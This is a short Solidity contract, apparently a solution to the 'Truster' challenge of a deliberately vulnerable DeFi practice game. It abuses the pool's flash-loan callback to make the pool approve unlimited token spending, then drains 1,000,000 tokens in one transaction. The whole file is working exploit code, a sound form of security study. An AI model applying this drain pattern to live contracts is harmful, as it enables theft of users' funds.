// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract HackTruster {
    TrusterLenderPool pool;

    constructor(TrusterLenderPool _pool) {
        pool = _pool;
    }

    function hack(DamnValuableToken _token) public {
        // callback으로 approve 해버리기
        pool.flashLoan(
            0,
            msg.sender,
            address(_token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                type(uint256).max
            )
        );
        _token.transferFrom(address(pool), msg.sender, 1000000 ether);
    }

    fallback() external {
        pool.flashLoan(0, address(this), address(this), "0x");
    }

    receive() external payable {}
}
